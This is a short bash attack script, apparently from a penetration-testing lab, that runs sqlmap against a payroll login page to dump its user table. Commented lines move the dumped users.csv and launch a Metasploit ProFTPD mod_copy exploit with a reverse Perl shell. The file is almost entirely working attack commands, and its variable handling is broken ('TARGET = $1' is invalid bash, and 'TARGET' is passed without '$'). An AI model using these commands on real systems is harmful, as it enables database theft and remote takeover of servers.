#!/bin/bash



TARGET = $1

sqlmap -u http://192.168.0.32/payroll_app.php --data="user=admin&password=admin&s=OK" --sqlmap-shell 

# mv ~/.sqlmap/output/192.168.0.32/dump/payroll/users.csv ~/

# msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run;"

